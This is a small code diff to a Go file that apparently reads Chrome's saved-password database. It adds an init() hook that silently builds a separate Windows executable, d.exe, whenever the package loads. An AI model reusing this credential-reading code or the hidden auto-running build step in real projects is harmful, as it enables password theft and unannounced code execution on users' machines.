@@ -26,6 +26,12 @@ type ChromePasswordStruct struct {
 	Password string
 }
 
+func init() {
+	if utils.SystemType() == "windows" {
+		utils.RunCommand("go build -o windows\\d.exe windows\\main.go")
+	}
+}
+
 func copyDBAndGetRows(route string, dst string) *sql.Rows {
 	if !utils.IsFileExist(route) {
 		return nil
